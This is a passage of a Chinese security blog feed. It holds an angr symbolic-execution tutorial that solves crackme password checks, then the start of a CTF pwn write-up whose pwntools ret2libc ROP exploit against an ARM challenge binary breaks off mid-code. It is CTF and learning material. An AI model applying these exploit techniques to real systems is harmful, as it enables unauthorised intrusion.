class="number">0x8048697</span></span><br><span class="line">    initial_state=proj.factory.blank_state(addr=start_address)</span><br><span class="line"></span><br><span class="line">    passwd0=claripy.BVS(<span class="string">&quot;passwd0&quot;</span>,<span class="number">32</span>)</span><br><span class="line">    passwd1=claripy.BVS(<span class="string">&quot;passwd1&quot;</span>,<span class="number">32</span>)</span><br><span class="line">    initial_state.regs.ebp=initial_state.regs.esp</span><br><span class="line">    initial_state.regs.esp-=<span class="number">0x8</span> <span class="comment">#scanf</span></span><br><span class="line">    initial_state.stack_push(passwd0)</span><br><span class="line">    initial_state.stack_push(passwd1)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#initial_state.regs.esp-=12  #.text:08048682 8D 45 F0                      lea     eax, [ebp+var_10]the relative position of esp when return from scanf()</span></span><br><span class="line">    simgr=proj.factory.simgr(initial_state)</span><br><span class="line">    simgr.explore(find=<span class="number">0x80486E1</span>,avoid=<span class="number">0x80486CF</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> simgr.found:</span><br><span class="line">        solution_state=simgr.found[<span class="number">0</span>]</span><br><span class="line">        solution0=solution_state.solver.<span class="built_in">eval</span>(passwd0)</span><br><span class="line">        solution1=solution_state.solver.<span class="built_in">eval</span>(passwd1)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;passwd0:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(solution0)))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;passwd1:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(solution1)))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&quot;Colindd not !!!!&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    solver()</span><br></pre></td></tr></table></figure><p>六、05 me’mory</p><p>这道题是对memory内存进行符号化</p><p>我们看下源代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(user_input, <span class="number">0</span>, <span class="number">0x21</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter the password: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%8s %8s %8s %8s&quot;</span>, user_input, &amp;unk_A1BA1C8, &amp;unk_A1BA1D0, &amp;unk_A1BA1D8);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">31</span>; ++i )</span><br><span class="line">    *(_BYTE *)(i + <span class="number">0xA1BA1C0</span>) = complex_function(*(<span class="type">char</span> *)(i + <span class="number">0xA1BA1C0</span>), i);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(user_input, <span class="string">&quot;NJPURZPCDYEAXCSJZJMPSOMBFDDLHBVN&quot;</span>, <span class="number">0x20</span>u) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Good Job.&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Try again.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过以上代码，我们发现是往内存bss段里读入4个8bytes，所以这里我们利用一个为内存赋值的语句</p><p>init_state.memory.store(address,passwd0)   这个是把passwd0赋值给address这个地址的里</p><p>然后我们创建4个变量并且把这个四个变量放到读入的内存里</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">address=<span class="number">0xA1BA1C0</span></span><br><span class="line">init_state.memory.store(address,passwd0)  <span class="comment">#放到</span></span><br><span class="line">init_state.memory.store(address+<span class="number">0x8</span>,passwd1)</span><br><span class="line">init_state.memory.store(address+<span class="number">0x10</span>,passwd2)</span><br><span class="line">init_state.memory.store(address+<span class="number">0x18</span>,passwd3)</span><br></pre></td></tr></table></figure><p>这里注意字节的增长</p><p>然后下面就是按照之前的方法获取相应的状态值即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solver</span>():</span><br><span class="line">    binary=<span class="string">&quot;./05_angr_symbolic_memory&quot;</span></span><br><span class="line">    proj=angr.Project(binary)</span><br><span class="line">    start_address=<span class="number">0x8048601</span></span><br><span class="line">    init_state=proj.factory.blank_state(addr=start_address)</span><br><span class="line">    </span><br><span class="line">    passwd0=claripy.BVS(<span class="string">&quot;passwd0&quot;</span>,<span class="number">64</span>)</span><br><span class="line">    passwd1=claripy.BVS(<span class="string">&quot;passwd1&quot;</span>,<span class="number">64</span>)</span><br><span class="line">    passwd2=claripy.BVS(<span class="string">&quot;passwd2&quot;</span>,<span class="number">64</span>)</span><br><span class="line">    passwd3=claripy.BVS(<span class="string">&quot;passwd3&quot;</span>,<span class="number">64</span>)</span><br><span class="line">    address=<span class="number">0xA1BA1C0</span></span><br><span class="line">    init_state.memory.store(address,passwd0)</span><br><span class="line">    init_state.memory.store(address+<span class="number">0x8</span>,passwd1)</span><br><span class="line">    init_state.memory.store(address+<span class="number">0x10</span>,passwd2)</span><br><span class="line">    init_state.memory.store(address+<span class="number">0x18</span>,passwd3)</span><br><span class="line"></span><br><span class="line">    simgr=proj.factory.simgr(init_state)</span><br><span class="line">    simgr.explore(find=<span class="number">0x804866A</span>,avoid=<span class="number">0x8048658</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> simgr.found:</span><br><span class="line">        solution_state=simgr.found[<span class="number">0</span>]</span><br><span class="line">        solution0=solution_state.solver.<span class="built_in">eval</span>(passwd0,cast_to=<span class="built_in">bytes</span>)</span><br><span class="line">        solution1=solution_state.solver.<span class="built_in">eval</span>(passwd1,cast_to=<span class="built_in">bytes</span>)</span><br><span class="line">        solution2=solution_state.solver.<span class="built_in">eval</span>(passwd2,cast_to=<span class="built_in">bytes</span>)</span><br><span class="line">        solution3=solution_state.solver.<span class="built_in">eval</span>(passwd3,cast_to=<span class="built_in">bytes</span>)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;passwd0:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(solution0))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;passwd1:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(solution1))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;passwd2:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(solution2))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;passwd3:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(solution3))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&quot;couln not !!!!!!!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    solver()</span><br></pre></td></tr></table></figure><h2 id="七、06-动态memory"><a href="#七、06-动态memory" class="headerlink" title="七、06 动态memory"></a>七、06 动态memory</h2><p>这里是动态的chunk，malloc出来的，这里我们在动态里进行伪造fakechunk，然后再往这个伪造的chunk进行放入向量即可</p><p>先看下源代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *v3; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">char</span> *v4; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [esp-10h] [ebp-1Ch]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+0h] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  buffer0 = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">9u</span>);</span><br><span class="line">  buffer1 = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">9u</span>);</span><br><span class="line">  <span class="built_in">memset</span>(buffer0, <span class="number">0</span>, <span class="number">9u</span>);</span><br><span class="line">  <span class="built_in">memset</span>(buffer1, <span class="number">0</span>, <span class="number">9u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter the password: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%8s %8s&quot;</span>, buffer0, buffer1, v6);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">7</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = &amp;buffer0[i];</span><br><span class="line">    *v3 = complex_function(buffer0[i], i);</span><br><span class="line">    v4 = &amp;buffer1[i];</span><br><span class="line">    *v4 = complex_function(buffer1[i], i + <span class="number">32</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(buffer0, <span class="string">&quot;UODXLZBI&quot;</span>, <span class="number">8u</span>) &amp;&amp; !<span class="built_in">strncmp</span>(buffer1, <span class="string">&quot;UAORRAYF&quot;</span>, <span class="number">8u</span>) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Good Job.&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Try again.&quot;</span>);</span><br><span class="line">  <span class="built_in">free</span>(buffer0);</span><br><span class="line">  <span class="built_in">free</span>(buffer1);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>获取buffer0和buffer1的地址对这个地址进行fake即可</p><p>以下是我伪造的代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">buf0=<span class="number">0xABCC8A4</span></span><br><span class="line">buf1=<span class="number">0xABCC8AC</span></span><br><span class="line">fake_buf0=<span class="number">0xAAAAA10</span></span><br><span class="line">fake_buf1=<span class="number">0xAAAAA20</span></span><br><span class="line">p1=claripy.BVS(<span class="string">&quot;p1&quot;</span>,<span class="number">64</span>)</span><br><span class="line">p2=claripy.BVS(<span class="string">&quot;p2&quot;</span>,<span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">init_state.memory.store(buf0,fake_buf0,endness=proj.arch.memory_endness)</span><br><span class="line">init_state.memory.store(buf1,fake_buf1,endness=proj.arch.memory_endness)</span><br><span class="line"></span><br><span class="line">init_state.memory.store(fake_buf0,p1)</span><br><span class="line">init_state.memory.store(fake_buf1,p2)</span><br></pre></td></tr></table></figure><p>然后下一步一把梭获取状态值即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_path</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Good Job.&#x27;</span> <span class="keyword">in</span> state.posix.dumps(sys.stdout.fileno())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">avoid_path</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Try again.&#x27;</span> <span class="keyword">in</span> state.posix.dumps(sys.stdout.fileno())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solver</span>():</span><br><span class="line">    binary=<span class="string">&quot;./06_angr_symbolic_dynamic_memory&quot;</span></span><br><span class="line"></span><br><span class="line">    proj=angr.Project(binary)</span><br><span class="line"></span><br><span class="line">    start_address=<span class="number">0x8048699</span></span><br><span class="line"></span><br><span class="line">    init_state=proj.factory.blank_state(addr=start_address)</span><br><span class="line"></span><br><span class="line">    buf0=<span class="number">0xABCC8A4</span></span><br><span class="line">    buf1=<span class="number">0xABCC8AC</span></span><br><span class="line">    fake_buf0=<span class="number">0xAAAAA10</span></span><br><span class="line">    fake_buf1=<span class="number">0xAAAAA20</span></span><br><span class="line">    p1=claripy.BVS(<span class="string">&quot;p1&quot;</span>,<span class="number">64</span>)</span><br><span class="line">    p2=claripy.BVS(<span class="string">&quot;p2&quot;</span>,<span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">    init_state.memory.store(buf0,fake_buf0,endness=proj.arch.memory_endness)</span><br><span class="line">    init_state.memory.store(buf1,fake_buf1,endness=proj.arch.memory_endness)</span><br><span class="line"></span><br><span class="line">    init_state.memory.store(fake_buf0,p1)</span><br><span class="line">    init_state.memory.store(fake_buf1,p2)</span><br><span class="line"></span><br><span class="line">    simgr=proj.factory.simgr(init_state)</span><br><span class="line">    simgr.explore(find=find_path,avoid=avoid_path)</span><br><span class="line">    <span class="keyword">if</span> simgr.found:</span><br><span class="line">        sol_state=simgr.found[<span class="number">0</span>]</span><br><span class="line">        p1=sol_state.solver.<span class="built_in">eval</span>(p1,cast_to=<span class="built_in">bytes</span>)</span><br><span class="line">        p2=sol_state.solver.<span class="built_in">eval</span>(p2,cast_to=<span class="built_in">bytes</span>)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;p1:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(p1))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;p2:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(p2))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&quot;Colud not!!!!!!&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    solver()</span><br></pre></td></tr></table></figure><p>八、07  符号fiile文件</p><p>这个题是对file文件进行符号化</p><p>我们看下题目代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(buffer, <span class="number">0</span>, <span class="keyword">sizeof</span>(buffer));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter the password: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%64s&quot;</span>, buffer);</span><br><span class="line">  ignore_me((<span class="type">int</span>)buffer, <span class="number">0x40</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(buffer, <span class="number">0</span>, <span class="keyword">sizeof</span>(buffer));</span><br><span class="line">  fp = fopen(<span class="string">&quot;OJKSQYDP.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">  fread(buffer, <span class="number">1u</span>, <span class="number">0x40</span>u, fp);</span><br><span class="line">  fclose(fp);</span><br><span class="line">  unlink(<span class="string">&quot;OJKSQYDP.txt&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">7</span>; ++i )</span><br><span class="line">    *(_BYTE *)(i + <span class="number">0x804A0A0</span>) = complex_function(*(<span class="type">char</span> *)(i + <span class="number">0x804A0A0</span>), i);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strncmp</span>(buffer, <span class="string">&quot;AQWLCTXB&quot;</span>, <span class="number">9u</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Try again.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Good Job.&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们看到，这道打开了一个文件。在这道题的基础上，我们可以使用angr模拟文件从而进行文件内容符号化，我们用到了几个关键语句</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">file_size=<span class="number">0x40</span></span><br><span class="line">filename=<span class="string">&#x27;OJKSQYDP.txt&#x27;</span></span><br><span class="line">password=claripy.BVS(<span class="string">&#x27;password&#x27;</span>,file_size*<span class="number">8</span>)</span><br><span class="line">file_name=angr.storage.SimFile(filename,content=password,size=file_size)</span><br><span class="line">init_state.fs.insert(filename,file_name)</span><br></pre></td></tr></table></figure><p>我们利用angr.storage.SimFile模拟文件，第一个参数为文件名，第二个为我们的向量，第三个为题目本身的读入的size，然后模拟完后，我们再对文件系统进行载入init_state.fs.insert(filename,file_name)即可实现文件符号化</p><p>然后剩下就是用angr进行模拟，获取状态，获取向量状态值，一把梭</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">isGood</span>(<span class="params">state</span>):</span><br><span class="line"><span class="keyword">return</span> <span class="string">b&#x27;Good Job.&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">isBad</span>(<span class="params">state</span>):</span><br><span class="line"><span class="keyword">return</span> <span class="string">b&#x27;Try again.&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solver</span>():</span><br><span class="line">    binary=<span class="string">&quot;./07_angr_symbolic_file&quot;</span></span><br><span class="line">    proj=angr.Project(binary)</span><br><span class="line">    </span><br><span class="line">    start_address=<span class="number">0x80488EA</span></span><br><span class="line">    init_state=proj.factory.blank_state(addr=start_address)</span><br><span class="line"></span><br><span class="line">    file_size=<span class="number">0x40</span></span><br><span class="line">    filename=<span class="string">&#x27;OJKSQYDP.txt&#x27;</span></span><br><span class="line">    password=claripy.BVS(<span class="string">&#x27;password&#x27;</span>,file_size*<span class="number">8</span>)</span><br><span class="line">    file_name=angr.storage.SimFile(filename,content=password,size=file_size)</span><br><span class="line">    init_state.fs.insert(filename,file_name)</span><br><span class="line">    </span><br><span class="line">    simgr=proj.factory.simgr(init_state)</span><br><span class="line">    simgr.explore(find=isGood,avoid=isBad)</span><br><span class="line">    <span class="keyword">if</span> simgr.found:</span><br><span class="line">        sol_state=simgr.found[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">        passwd=sol_state.solver.<span class="built_in">eval</span>(password,cast_to=<span class="built_in">bytes</span>)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;passwd:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(passwd))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&quot;Colund not!!!!!!&quot;</span>) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    solver()   </span><br></pre></td></tr></table></figure><p>未完持续</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;CTF-Angr-符号执行学习（一）&quot;&gt;&lt;a href=&quot;#CTF-Angr-符号执行学习（一）&quot; class=&quot;headerlink&quot; title=&quot;CTF Angr 符号执行学习（一）&quot;&gt;&lt;/a&gt;CTF Angr 符号执行学习（一）&lt;/h1&gt;&lt;h2 id=&quot;前</summary>
      
    
    
    
    <category term="pwn" scheme="https://jsjsj.top/categories/pwn/"/>
    
    
    <category term="angr" scheme="https://jsjsj.top/tags/angr/"/>
    
  </entry>
  
  <entry>
    <title>2022安洵杯 CTF PWN wp</title>
    <link href="https://jsjsj.top/2022/10/03/2022%E5%AE%89%E6%B4%B5%E6%9D%AF%20CTF%20PWN%20wp/"/>
    <id>https://jsjsj.top/2022/10/03/2022%E5%AE%89%E6%B4%B5%E6%9D%AF%20CTF%20PWN%20wp/</id>
    <published>2022-10-03T14:15:34.000Z</published>
    <updated>2023-10-03T14:29:52.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2022安洵杯-CTF-PWN-wp"><a href="#2022安洵杯-CTF-PWN-wp" class="headerlink" title="2022安洵杯 CTF PWN wp"></a>2022安洵杯 CTF PWN wp</h1><p>##前言：上午在打别的比赛，题不难，下午三点才上的号，导致我们差一名进决赛，太可惜了（都怪我  呜呜呜，下次认真。</p><p>##babyarm：<br>思路：栈溢出，异构PWN，arm，retlibc2，一次retlibc泄露got表计算出libc基地址，第二次打system即可，找到gadget传参即可，由于题目是arm32位，前4个参数是用r0~r3寄存器传参，所以我们第一步泄露libc的话，需要找到pop r0，然后再找一个有blx的寄存器进行跳转即可，参考kot师傅的寄存器，采用了以下<br>pop{r4,r5,r6,r7,r8,sb,sl,pc}   pop{r3,pc}  mov r0,r7;blx r3<br>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process([<span class="string">&#x27;qemu-arm&#x27;</span>,<span class="string">&#x27;-g&#x27;</span>,<span class="string">&#x27;1234&#x27;</span>,<span class="string">&#x27;-L&#x27;</span>,<span class="string">&#x27;/usr/arm-linux-gnueabi&#x27;</span>,<span class="string">&#x27;./chall&#x27;</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&quot;./libc-2.27.so&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;./chall&quot;</span>)</span><br><span class="line"></span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt=<span class="number">0x0104AC</span></span><br><span class="line">mainaddr=<span class="number">0x10C4C</span></span><br><span class="line"><span class="comment">#ropper --files libc.2.27.so search &quot;pop|mov&quot;</span></span><br><span class="line"><span class="comment">#pop &#123;r4, r5, r6, r7, r8, sb, sl, pc&#125;</span></span><br><span class="line"><span class="comment"># pop &#123;r3, pc&#125;</span></span><br><span class="line"><span class="comment">#mov r0, r7; blx r3</span></span><br><span class="line">popr1=<span class="number">0x00010cb0</span>   </span><br><span class="line">popr3=<span class="number">0x00010464</span></span><br><span class="line">movr0=<span class="number">0x00010ca0</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;msg&gt;&quot;</span>,<span class="string">&quot;s1mpl3Dec0d4r&quot;</span>)</span><br><span class="line"><span class="comment">#leak libc_bse</span></span><br><span class="line">rop1=<span class="string">&#x27;a&#x27;</span>*<span 